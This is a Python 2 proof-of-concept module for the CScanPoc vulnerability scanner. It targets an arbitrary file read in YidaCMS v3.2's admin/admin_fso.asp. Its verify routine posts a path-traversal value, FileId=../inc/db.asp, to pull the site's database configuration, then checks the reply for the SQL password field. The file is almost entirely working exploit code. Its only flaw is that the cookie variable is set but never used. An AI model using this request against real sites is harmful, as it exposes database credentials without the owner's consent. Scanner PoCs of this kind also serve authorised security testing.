# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = 'd45fdb38-73e0-4a83-bfa5-a37235da8796'
    name = 'YidaCMS v3.2 /Yidacms/admin/admin_fso.asp 任意文件读取漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-08-27'  # 漏洞公布时间
    desc = '''
        YidaCMS /Yidacms/admin/admin_fso.asp在读取文件时，没有任何过滤处理，直接拼接文件路径，然后直接读取。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'YidaCMS(易达CMS)'  # 漏洞应用名称
    product_version = 'v3.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4e6bfa56-2c3f-4d62-83a3-b7991651af98'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            #属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #this poc need to login, so special cookie for target must be included in http headers.
            cookie = 'Unkonwn' #需要填上对应的cookie
            headers = {
                'cookie': 'cookie'
            }
            verify_url = self.target + '/admin/admin_fso.asp?action=Edit'
            post_content = r'''FileId=../inc/db.asp&ThisDir='''
            req = urllib2.Request(verify_url, post_content, headers=headers)
            content = urllib2.urlopen(req).read()

            if 'webpath' in content and 'YidaCms_Sqlpass' in content:
                #args['success'] = True
                #args['poc_ret']['vul_url'] = verify_url
                #args['poc_ret']['post_content'] = post_content
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
